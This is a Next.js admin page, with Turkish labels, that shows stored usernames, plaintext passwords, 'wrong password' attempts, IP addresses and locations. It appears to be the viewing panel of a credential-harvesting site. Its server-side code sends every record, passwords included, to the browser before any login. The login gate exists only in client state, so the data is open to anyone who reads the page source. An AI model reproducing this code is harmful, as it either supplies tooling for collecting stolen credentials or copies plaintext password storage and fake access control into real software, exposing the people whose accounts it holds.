import { useState } from "react";
import dbConnect from "../lib/dbConnect";
import User from "../models/User";

export default function Admin({ users }: { users: any }) {
    const [loggedIn, setLoggedIn] = useState(false);
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");

    const onClick = async (e: any) => {
        const response = await fetch("/api/accounts", {
            method: "POST",
            body: JSON.stringify({
                username,
                password
            }),
            headers: {
                "Content-Type": "application/json",
            },
        })

        if (!response.ok) return setLoggedIn(false);

        const data = await response.json();

        return setLoggedIn(data.success);
    }

    if (loggedIn) {
        return (
            <div className="flex flex-col space-y-6 min-h-screen px-2 py-6">
                <div>
                    {users.map((user: any) => (
                        <div key={user.password} className="border-2 w-96">
                            <h1>Username: <strong>{user.username}</strong></h1>
                            <h1>Password: <strong>{user.password}</strong></h1>
                            <h1>Wrong password: <strong>{user.wrongPassword || "Yok"}</strong></h1>
                            <h1>Ip: <strong>{user.ip}</strong></h1>
                            <h1>Country: <strong>{user.country}</strong></h1>
                            <h1>City: <strong>{user.city}</strong></h1>
                        </div>
                    ))}
                </div>
            </div>
        )
    }

    return (
        <div className="px-2 py-2 flex flex-col space-y-4 min-h-screen">
            <h1>Giriş yap</h1>
            <input type={"text"} placeholder="Username" value={username} onChange={(e) => setUsername(e.target.value)} className="border-2 rounded-md px-2 py-2 border-black w-48" />
            <input type={"password"} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} className="border-2 rounded-md px-2 py-2 border-black w-48"/>
            <button onClick={onClick} className="bg-black text-white rounded-md px-2 py-2 w-48" >Giriş</button>
        </div>
    )
}

export async function getServerSideProps() {
    await dbConnect();

    const result = await User.find({});

    const users = result.map((doc) => {
        const user = doc.toObject();
        user._id = doc._id.toString();
        return user;
    })

    return { props: { users }}
}
